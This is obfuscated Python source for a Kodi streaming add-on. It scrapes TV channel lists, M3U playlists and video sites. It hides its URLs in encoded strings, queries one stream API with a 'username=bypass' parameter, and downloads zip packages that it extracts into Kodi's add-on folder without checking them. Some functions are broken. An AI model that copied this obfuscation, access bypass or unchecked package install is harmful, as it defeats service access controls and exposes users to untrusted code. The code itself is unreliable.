 if 31 - 31: i11iIiiIii - OO0O / ii11ii1ii - OOooOooo
 iii1111iiI1ii ( 'All Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Entertainment' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Movies' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Music' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'News' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Sports' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Documentary' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Kids' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Food' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Religious' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'USA Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 iii1111iiI1ii ( 'Other' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 if 5 - 5: i11iIiiIii * Oo
 if 29 - 29: OOooOooo / OO0O % OOOO00ooo0Ooo
def ii1iIII1ii ( Cat_Name ) :
 if 47 - 47: OOOO00ooo0Ooo . O00oo0OO0oOOO * OOooOooo - OO0O . OOOO00ooo0Ooo - Ii11I
 oOO0O00OoOo = False
 I1i1I11 = '0'
 if Cat_Name == 'All Channels' : oOO0O00OoOo = True
 if Cat_Name == 'Entertainment' : I1i1I11 = '1'
 if Cat_Name == 'Movies' : I1i1I11 = '2'
 if Cat_Name == 'Music' : I1i1I11 = '3'
 if Cat_Name == 'News' : I1i1I11 = '4'
 if Cat_Name == 'Sports' : I1i1I11 = '5'
 if Cat_Name == 'Documentary' : I1i1I11 = '6'
 if Cat_Name == 'Kids' : I1i1I11 = '7'
 if Cat_Name == 'Food' : I1i1I11 = '8'
 if Cat_Name == 'Religious' : I1i1I11 = '9'
 if Cat_Name == 'USA Channels' : I1i1I11 = '10'
 if Cat_Name == 'Other' : I1i1I11 = '11'
 if 9 - 9: OOOo0
 OOOooo = iii ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 oOooOOOoOo = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( OOOooo )
 print 'Len Match: >>>' + str ( len ( oOooOOOoOo ) )
 for i1I1I , oO0O00oOOoooO , O0i1I11I in oOooOOOoOo :
  I1IIi1i1Ii1I1 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( oO0O00oOOoooO ) . replace ( '\\' , '' )
  if O0i1I11I == I1i1I11 :
   iii1111iiI1ii ( i1I1I , '' , 7022 , I1IIi1i1Ii1I1 )
  elif oOO0O00OoOo == True :
   iii1111iiI1ii ( i1I1I , '' , 7022 , I1IIi1i1Ii1I1 )
  else : pass
  if 94 - 94: OoOoOO00
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 37 - 37: OoooooooOO
def oo0OooO ( Search_Name ) :
 OOOooo = iii ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 oOooOOOoOo = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( OOOooo )
 oOooOOOoOo = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( OOOooo )
 for oO0O00oOOoooO , iI1i11 , Iii1I1111ii , Ii1IIiI1i in oOooOOOoOo :
  I1IIi1i1Ii1I1 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( oO0O00oOOoooO ) . replace ( '\\' , '' )
  oo00OOoOoO00 ( Search_Name + ': Link 1' , ( iI1i11 ) . replace ( '\\' , '' ) , 222 , I1IIi1i1Ii1I1 )
  oo00OOoOoO00 ( Search_Name + ': Link 2' , ( Iii1I1111ii ) . replace ( '\\' , '' ) , 222 , I1IIi1i1Ii1I1 )
  oo00OOoOoO00 ( Search_Name + ': Link 3' , ( Ii1IIiI1i ) . replace ( '\\' , '' ) , 222 , I1IIi1i1Ii1I1 )
  if 4 - 4: i1i1i11IIi + iIii1I11I1II1 * O00oo0OO0oOOO + Oo * OOooOOo % OoOoOO00
def OO0o0o0oo ( ) :
 OOOooo = iii ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 oOooOOOoOo = re . compile ( '#EXTINF:-1,(.+)\s*(.+)\s*' ) . findall ( OOOooo )
 for i1I1I , iI1i11 in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&amp;' , '&' ) . strip ( ) + '|connection=keep-alive' , 222 , ii11iIi1I + 'english.png' )
def iIiII1 ( ) :
 OOOooo = iii ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 oOooOOOoOo = re . compile ( '#EXTINF:-2,(.+)\s*(.+)\s*' ) . findall ( OOOooo )
 for i1I1I , iI1i11 in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&amp;' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'xxx.png' )
def i111iii1I1 ( ) :
 OOOooo = iii ( i1111 ( oo ( 0 , [ 97 , 129 , 72 , 149 , 82 , 100 , 48 , 63 , 99 , 170 , 68 , 159 , 111 , 42 , 118 , 83 , 76 , 128 , 51 , 61 , 100 , 44 , 51 , 201 , 100 , 148 , 121 , 134 , 53 ] , [ 159 , 114 , 70 , 98 , 144 , 50 , 37 , 82 , 253 , 112 , 184 , 99 , 50 , 71 , 154 , 120 , 110 , 108 , 179 , 101 , 250 , 72 , 65 , 82 , 125 , 50 , 52 , 76 , 28 , 109 , 124 , 78 , 191 , 118 , 193 , 76 , 193 , 110 , 145 , 86 , 92 , 114 , 193 , 76 , 41 , 50 , 82 , 82 , 206 , 118 , 32 , 100 , 163 , 50 , 209 , 53 , 191 , 115 , 42 , 98 , 30 , 50 , 237 , 70 , 26 , 107 , 70 , 99 , 64 , 121 , 115 , 57 , 230 , 116 , 32 , 97 , 39 , 88 , 58 , 104 , 38 , 50 , 77 , 98 , 185 , 50 , 86 , 81 , 80 , 117 , 111 , 98 , 226 , 84 , 75 , 78 , 210 , 49 ] ) ) )
 oOooOOOoOo = re . compile ( '#EXTINF:.+?,(.+)\s*(.+)\s*' ) . findall ( OOOooo )
 for i1I1I , iI1i11 in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , ( iI1i11 ) . replace ( '"' , ' ' ) . replace ( '&amp;' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'vod(1).png' )
  if 48 - 48: OoooooooOO . I1IiI
def oOIIIi11 ( url ) :
 url
 oooOo00O0 = xbmcgui . ListItem ( i1I1I , path = url )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , oooOo00O0 )
 return
 if 26 - 26: o0OOOoO0 . OOooOooo + OOOo0 . I1IiI + Ii11I
 if 17 - 17: Ii11I + i11iIiiIii + ii11ii1ii % Ii11I . ii
def I11iiIi1i1IIi ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<a class=.+?href="(.+?)">.+?<div class="videothumboverlay hidden-xs" id=".+?">(.+?)</div>.+?<div class="videothumbbox"><img src="(.+?)" class="videothumb" alt="(.+?)"></div>' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( "<a href='(.+?)' class='paginationnext'>Next &raquo;</a></div>" ) . findall ( OOOooo )
 for url , OOoooO00o0oo0 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , 'https://www.fitnessblender.com' + url , 7086 , 'https://www.fitnessblender.com' + oO0O00oOOoooO , '' , ( OOoooO00o0oo0 ) . replace ( '</p>' , ' ' ) . replace ( '<p>' , ' ' ) )
  ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 for url in IiiiiI1i1Iii :
  iii1111iiI1ii ( 'NEXT' , 'https://www.fitnessblender.com' + url , 7085 , ii11iIi1I + 'Next.png' )
  if 46 - 46: Ooo00oOo00o . O0 * OO0O / OOooOOo + OoooooooOO
def i1Ii1i1I11III ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<div class=\'videowrapper\'><iframe width="700" height="394" src="//www.youtube.com/embed/(.+?)?rel=0&amp;wmode=transparent" frameborder="0"></iframe></div>.+?<div class="col-xs-6 col-md-2 rightborder">(.+?)</div>.+?<p class="videodetailvalue"><img src=\'(.+?)\'/></p>' , re . DOTALL ) . findall ( OO00O0O )
 for url , OOoooO00o0oo0 , oO0O00oOOoooO in oOooOOOoOo :
  O00OOOoOoo0O ( 'PLAY' , url , 8043 , 'https://www.fitnessblender.com' + oO0O00oOOoooO , '' , OOoooO00o0oo0 )
  ooOoOO0oo0O ( 'tvshows' , 'Media Info 3' )
 o0o00oO0oo000 = re . compile ( '<h2 class="videodetailheader">Workout Details</h2>(.+?)</div>' , re . DOTALL ) . findall ( OO00O0O )
 for I1iiIiII in o0o00oO0oo000 :
  IIiI1111iI = ( I1iiIiII ) . replace ( '<p>' , '' ) . replace ( '</p>' , '' ) . replace ( '<br />' , '' ) . replace ( '&nbsp;' , '' ) . replace ( '<strong>' , '' ) . replace ( '</strong>' , '' ) . replace ( '"' , '' ) . replace ( '<' , '' ) . replace ( '>' , '' ) . replace ( 'a href' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&rsquo;t' , '' ) . replace ( '&amp;' , '&' )
  O0Oo000ooO00 ( 'INFO' , '' , 7087 , 'https://www.fitnessblender.com' + oO0O00oOOoooO , '' , IIiI1111iI )
  if 62 - 62: OOooOooo + O0 * Ooo00oOo00o
def oOoOO ( INFO ) :
 o0o00OO0 ( 'info for workout' , INFO )
 if 20 - 20: OO0O . Ooo00oOo00o * O00oo0OO0oOOO
 if 71 - 71: Oo . OoOoOO00 / OoOoOO00 * OOooOooo * Ooo00oOo00o
 if 25 - 25: i11iIiiIii + Oo . O00oo0OO0oOOO % OOOo0 - OO0O * i1IIi
def o00OoO0o0 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'cat-item-.+?"><a href="(.+?)" >(.+?)</a>' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , url , 9031 , ii11iIi1I + 'icon.png' )
def o0OOOoO0ooOOOo0 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" title=".+?" rel="bookmark"><time class="entry-date published updated" datetime=".+?">(.+?)</time></a>' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , url , 9032 , ii11iIi1I + 'icon.png' )
def o0oOOO ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '#EXTINF:-.+?,(.+)\s*(.+)\s*' ) . findall ( OOOooo )
 for i1I1I , url in oOooOOOoOo :
  if '://' in i1I1I :
   pass
   oo00OOoOoO00 ( ( i1I1I ) . replace ( '<br />' , '' ) , ( url ) . replace ( '<br />' , '' ) , 222 , ii11iIi1I + 'icon.png' )
def IIi11 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'EXTINF:-.+?,(.+)</div></li><li class=".+?"><div class=".+?">(.+?)</div>).findall' ) . findall ( OOOooo )
 for i1I1I , url in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , url , 222 , ii11iIi1I + 'icon.png' )
  if 78 - 78: o0OOOoO0 / ii - iIii1I11I1II1 - I1IiI
  if 60 - 60: OoOoOO00
  if 90 - 90: I1IiI
def IIii1i ( ) :
 OOOooo = iii ( 'http://www.disclose.tv/action/videolist/aliens/page/1/all/channel/1/category/1/' )
 oOooOOOoOo = re . compile ( '<li><a href="([^"]*)">(.+?)</a></li>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , 'http://www.disclose.tv/' + iI1i11 , 7010 , ii11iIi1I + 'disclose.png' )
  if 69 - 69: o0OOOoO0 / OoooooooOO % i11iIiiIii
  if 18 - 18: i11iIiiIii - OO0O * ii + OOooOOo
def IiiiIi1iiii11 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'href="([^"]*)"><img width="135" height="76" alt="([^"]*)".+?src="([^"]*)" />' , re . DOTALL ) . findall ( OOOooo )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( OOOooo )
 for url , i1I1I , oO0O00oOOoooO in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , 'http://www.disclose.tv/' + url , 7011 , oO0O00oOOoooO )
 for url in next :
  iii1111iiI1ii ( 'NEXT' , url , 7010 , ii11iIi1I + 'Next.png' )
  if 27 - 27: OOOo0 * OoOoOO00 - OOOO00ooo0Ooo
  if 50 - 50: OoooooooOO + Ii11I / OoOoOO00 * Oo
def O00O0 ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( 'url: "([^"]*)",' , re . DOTALL ) . findall ( OOOooo )
 IiiiiI1i1Iii = re . compile ( "src='([^']*)' type='([^']*)' />" , re . DOTALL ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  if 'http' in url :
   oo00OOoOoO00 ( 'video/flv' , url , 222 , ii11iIi1I + 'disclose.png' )
 for url , i1I1I in IiiiiI1i1Iii :
  oo00OOoOoO00 ( i1I1I , url , 222 , ii11iIi1I + 'disclose.png' )
  if 43 - 43: ii % Ooo00oOo00o - Oo - O0 - OoooooooOO
  if 4 - 4: OoOoOO00 - ii % Oo * i11iIiiIii
def iIiII1iiiiI ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<div id="play-1".+?src="(.+?)" scrolling="no".+?<li><a href="#play-1">(.+?)</a></li>' , re . DOTALL ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , ( url + '&fv=&sou=' ) . replace ( 'player' , 'watch' ) , 7000 , ii11iIi1I + 'icon.png' )
  if 80 - 80: Oo - OOooOOo - OoOoOO00 . i1i1i11IIi - O0 * i1i1i11IIi
def Iii1Iooo ( name , url , img ) :
 OO00O0O = iii ( url )
 II111 = re . compile ( '<iframe class="playerframe" src="(.+?)" scrolling=".+?" marginwidth=".+?" marginheight=".+?" vspace=".+?" hspace=".+?" allowfullscreen=".+?" webkitallowfullscreen=".+?" mozallowfullscreen=".+?" width=".+?" height=".+?" frameborder=".+?"></iframe>' , re . DOTALL ) . findall ( OO00O0O )
 I11iIi = len ( II111 )
 if 10 - 10: OoOoOO00 % Ooo00oOo00o % OOOo0 - Oo - Ii11I
 if 46 - 46: iIii1I11I1II1 * ii + i11iIiiIii . iIii1I11I1II1 . Ii11I / Ooo00oOo00o
 if I11iIi == 1 :
  for iI1111i1i1ii in II111 :
   iI1111i1i1ii = iI1111i1i1ii . replace ( 'player' , 'watch' )
   OooOo = iI1111i1i1ii + '&fv=&sou='
   O0OOoOOO0o0o = iii ( OooOo )
   iIOoo0ooo0oo = re . compile ( '<source src="(.+?)" type=".+?">' , re . DOTALL ) . findall ( O0OOoOOO0o0o )
   for I1ii1i in iIOoo0ooo0oo :
    I11iIiI1 = False
    Resolve ( I1ii1i )
    if 22 - 22: i1i1i11IIi * OOooOooo - OoooooooOO
 elif I11iIi > 1 :
  if 28 - 28: OOOo0
  for iI1111i1i1ii in II111 :
   O00 = iii ( iI1111i1i1ii )
   IiIIIIi = re . compile ( '<iframe width=".*?" height=".*?" frameborder=".*?" src="(.*?)" scrolling=".*?" marginwidth=".*?" marginheight=".*?" vspace=".*?" hspace=".*?" allowfullscreen=".*?" webkitallowfullscreen=".*?" mozallowfullscreen=".*?"></iframe>' , re . DOTALL ) . findall ( O00 )
   OoIIiIIIII1I = IiIIIIi
   OoIIiIIIII1I = ( str ( OoIIiIIIII1I ) ) . replace ( '[\'' , '' ) . replace ( '\']' , '' ) ;
   print 'Stripped url : ' + OoIIiIIIII1I
   oo00OOoOoO00 ( 'DOUBLE LINK' , OoIIiIIIII1I , 424 , '' )
   if 96 - 96: i11iIiiIii . OoOoOO00
   for url in IiIIIIi :
    iii1111iiI1ii ( 'DOUBLE LINK' , url , 424 , '' )
    try :
     Iii1I1111ii = Google . resolve ( url )
    except :
     pass
    try :
     iI1I = re . findall ( r"{'url': u'(.*?)', 'quality': 'HD'}, {'url': u'(.*?)', 'quality': 'SD'}" , str ( Iii1I1111ii ) )
     for Iii1IiI1iI1I , Iiii in iI1I :
      if 90 - 90: i11iIiiIii
      HD_URLS . append ( Iii1IiI1iI1I )
      SD_URLS . append ( Iiii )
    except :
     pass
 else :
  pass
  if 48 - 48: OoOoOO00 / Ii11I . i1i1i11IIi
def OOoo0O00 ( ) :
 if 53 - 53: O0 . OOOo0
 if 74 - 74: OO0O % I1IiI / Oo
 iii1111iiI1ii ( 'Genres' , 'http://cnfstudio.com/movies/' , 7002 , ii11iIi1I + 'Movies.png' )
 if 2 - 2: i1i1i11IIi % i1i1i11IIi % o0OOOoO0
 iii1111iiI1ii ( 'Search Movies' , '' , 7017 , ii11iIi1I + 'Movies.png' )
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 60 - 60: Ii11I
 if 73 - 73: OO0O
def OOoO0o0O0 ( ) :
 OOOooo = iii ( 'http://cnfstudio.com/' )
 oOooOOOoOo = re . compile ( '<a href="http://cnfstudio.com/genre/(.+?)">(.+?)</a>' ) . findall ( OOOooo )
 for iI1i11 , i1I1I in oOooOOOoOo :
  iii1111iiI1ii ( i1I1I , 'http://cnfstudio.com/genre/' + iI1i11 , 7003 , ii11iIi1I + 'icon.png' )
  if 88 - 88: Ooo00oOo00o * OOooOOo * Ii11I / Oo * Ooo00oOo00o
i1iiIIiiI111 = xbmcgui . Dialog ( )
if 100 - 100: OOooOOo . OOOo0
if 62 - 62: OO0O + OoOoOO00 % OO0O
def Ii1IIii ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt=".+?" />.+?<a href="(.+?)"><span class="player"></span></a>.+?<h2>(.+?)</h2>' , re . DOTALL ) . findall ( OOOooo )
 oooOOoo = re . compile ( "<link rel='next' href='(.+?)'/>" ) . findall ( OOOooo )
 for oO0O00oOOoooO , url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( ( i1I1I ) . replace ( '&#038;' , '' ) . replace ( '&#8216;' , '' ) . replace ( '&#8217;' , '' ) . replace ( '&#8211;' , '' ) , url , 7004 , oO0O00oOOoooO )
 oooOOoo = oooOOoo
 for url in oooOOoo :
  iii1111iiI1ii ( 'Next Page' , url , 7003 , ii11iIi1I + 'Next.png' )
  if 36 - 36: Ii11I * OOooOooo
def i1iIii1II1i ( url ) :
 if 27 - 27: ii11ii1ii / Ii11I
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<div id="play-1" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</div>' , re . DOTALL ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  Ii1IIiiIIi = url + '&fv=&sou='
  Ii1IIiiIIi = Ii1IIiiIIi . replace ( 'player' , 'watch' )
  IiiIiiIIII = oOoOOOOoO0 ( Ii1IIiiIIi )
  IiiIiIIi1 = oOoOOOOoO0 ( url )
  if 40 - 40: O00oo0OO0oOOO . I1IiI * O0
  if 6 - 6: OOOo0 - OoOoOO00 . OOOo0 + OOOO00ooo0Ooo . Ii11I
def oOoOOOOoO0 ( url ) :
 if 74 - 74: i1IIi
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<video id=".+?<source src="(.+?)" type="video/mp4">' , re . DOTALL ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOoO00 ( url )
  if 15 - 15: i1IIi + i1i1i11IIi % OOOo0 / i11iIiiIii * I1IiI
  if 69 - 69: i11iIiiIii
def ooOoo ( ) :
 O0Oo000ooO00 ( '[COLORgreen]Local M3u[/COLOR]' , oOo0oooo00o , 2001 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Remote M3u[/COLOR]' , Oo0o0000o0o0 , 1009 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 41 - 41: O00oo0OO0oOOO % O00oo0OO0oOOO - i1i1i11IIi % Ooo00oOo00o - OoooooooOO - O00oo0OO0oOOO
def oOOo00O0O0 ( url ) :
 oOooOOOoOo = re . compile ( '^#EXTINF:-?[0-9]*(.*?),(.*?)\n(.*?)$' , re . I + re . M + re . U + re . S ) . findall
 for iiIIiiI , i1I1I , url in oOooOOOoOo :
  oo00OOoOoO00 ( i1I1I , url , 222 , ii11iIi1I + 'streams.png' )
  if 90 - 90: o0OOOoO0 . I1IiI * OoOoOO00 % OO0O
  if 36 - 36: OOOo0 - Oo % Ii11I . OOOO00ooo0Ooo + OOOO00ooo0Ooo + OOooOooo
def II1III11Iii1I ( ) :
 O0Oo000ooO00 ( '[COLORgreen]CATAGORIES[/COLOR]' , '' , 10051 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]SEARCH[/COLOR]' , '' , 10052 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 if 62 - 62: i1i1i11IIi . O0 . iIii1I11I1II1
 if 94 - 94: OO0O % OOOO00ooo0Ooo % i1IIi
o0oO0 = xbmcaddon . Addon ( id = 'plugin.video.GenieTv' )
oOOoo00O0O = xbmcgui . Dialog ( )
oooOOOOO = xbmc . translatePath ( 'special://home/' )
Oo0oO0ooo = xbmcgui . DialogProgress ( )
o0OoOo0o0O00 = 'https://addons.tvaddons.ag/'
if 33 - 33: OO0O + OoooooooOO - Ooo00oOo00o / i1IIi / OoooooooOO
def OOO0 ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 O0OOoooo0 = 'https://addons.tvaddons.ag/search/?keyword=' + oooooo0O000o
 OO00O0O = iii ( O0OOoooo0 )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OO00O0O )
 for iI1i11 , Ooo0oOooo0 , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I , iI1i11 , 10054 , 'https://addons.tvaddons.ag/' + Ooo0oOooo0 , i1iiIII111ii , '' )
  if 21 - 21: Oo * OOooOOo + OoooooooOO . o0OOOoO0 % ii
  if 50 - 50: I1IiI - ii + iIii1I11I1II1 - Ooo00oOo00o . Oo
def iiiiIii11i1 ( ) :
 OO00O0O = iii ( o0OoOo0o0O00 )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)"><span class="thumbnail"><img src="(.+?)" class="pic" alt=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OO00O0O )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  if 'Repositories' in i1I1I :
   pass
  elif 'Services' in i1I1I :
   pass
  elif 'International' in i1I1I :
   pass
  else :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 10053 , 'https://addons.tvaddons.ag/' + oO0O00oOOoooO , i1iiIII111ii , '' )
   if 7 - 7: O0 * i1i1i11IIi - OOooOOo * O0 + iIii1I11I1II1 % I1IiI
   if 92 - 92: OOOo0 . OoOoOO00
def Addon ( url ) :
 OO00O0O = iii ( url )
 II1 = re . compile ( '<li class="nextPage"><a class=".+?" href="(.+?)"><dfn title="next Page">.+?</dfn></a></li>' ) . findall ( OO00O0O )
 for url in II1 :
  O0Oo000ooO00 ( '[COLORgreen]NEXT PAGE[/COLOR]' , 'https://addons.tvaddons.ag' + url , 10053 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 oOooOOOoOo = re . compile ( '<li><a href="(.+?)"><span class=".+?"><img src="(.+?)" width=".+?" alt=".+?" class=".+?" /></span><strong>(.+?)</strong></a></li>' ) . findall ( OO00O0O )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  if 'Please' in i1I1I :
   pass
  else :
   O0Oo000ooO00 ( i1I1I , url , 10054 , 'https://addons.tvaddons.ag/' + oO0O00oOOoooO , i1iiIII111ii , '' )
   if 93 - 93: i1IIi * o0OOOoO0 . OOOO00ooo0Ooo * OOooOooo
   if 4 - 4: ii11ii1ii * O0 - o0OOOoO0 - i11iIiiIii / OOooOOo . Ii11I
def i1ii11I111Ii ( url , name ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)"' ) . findall ( OO00O0O )
 for url in oOooOOOoOo :
  if 'plugin' in url :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + url
   OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
   Oo0oO0ooo = xbmcgui . DialogProgress ( )
   Oo0oO0ooo . create ( "Origin+Jaybox" , "Downloading Content" , '' , 'Please Wait' )
   oo0oOO00oO = os . path . join ( OO0O00oOo , name + '.zip' )
   try :
    os . remove ( oo0oOO00oO )
   except :
    pass
   downloader . download ( url , oo0oOO00oO , Oo0oO0ooo )
   OoOoO00O0 = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
   time . sleep ( 2 )
   Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
   print '======================================='
   print OoOoO00O0
   print '======================================='
   extract . all ( oo0oOO00oO , OoOoO00O0 , Oo0oO0ooo )
   I1I1I ( )
   if 77 - 77: Ooo00oOo00o + Ooo00oOo00o . OO0O * OoooooooOO + Ooo00oOo00o
def I1I1I ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "Origin + Genie TV" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Origin + Jaybox[/COLOR]" )
 return
 if 6 - 6: i1IIi - OOOO00ooo0Ooo
 if 89 - 89: OO0O - OOOO00ooo0Ooo . O0 % OoooooooOO . i11iIiiIii
def IiIIiII1I ( ) :
